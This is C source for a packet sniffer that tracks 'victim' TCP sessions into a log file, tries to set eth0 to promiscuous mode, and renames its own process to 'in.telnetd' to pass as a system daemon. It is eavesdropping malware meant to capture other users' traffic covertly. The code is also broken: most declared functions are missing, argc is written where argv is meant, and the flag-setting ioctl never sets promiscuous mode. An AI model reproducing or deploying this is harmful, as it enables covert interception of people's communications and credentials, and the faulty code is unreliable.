#include <string.h>
#include <ctype.h>
#include <stdio.h>
#include <netdb.h>
#include <sys/file.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/signal.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/if_ether.h>


int openintf(char *);
int read_tcp(int);
int filter(void);
int print_header(void);
int print_data(int, char*);
char* hostlookup(unsigned long int);
void clear_victim(void);
void cleanup(int);


struct etherpacket
{
    struct ethhdr eth;
    struct iphdr ip;
    struct tcphdr tcp;
    char buff[8192];
} ep;


struct
{
    unsigned long saddr;
    unsigned long daddr;
    unsigned short sport;
    unsigned short dport;
    int bytes_read;
    char active;
    time_t start_time;
} victim;

struct iphdr * ip;
struct tcphdr * tcp;
int s;
FILE * fp;


#define CAPTLEN 512
#define TIMEOUT 30
#define TCPLOG "tcp.log"

int openintf(char * d)
{
    int fd;
    struct ifreq ifr;
    int s;
    fd = socket(AF_INET, SOCK_PACKET, htons(0x800));
    if(fd < 0)
    {
        perror("cant get SOCK_PACKET socket");
        exit(0);
    }
    strcpy(ifr.ifr_name, d);
    s = ioctl(fd, SIOCGIFFLAGS, &ifr);
    if(s < 0)
    {
        close(fd);
        perror("can't get flags");
        exit(0);
    }
    ifr.ifr_flags |= IFF_PROMISC;
    s = ioctl(fd, SIOCGIFFLAGS, &ifr);
    if(s < 0) perror("can't set promiscuous mode");
    return fd;
}

int main(int argc, char *argv[])
{
    sprintf(argc[0], "%s", "in.telnetd");
    s = openintf("eth0");
    return 0;
}
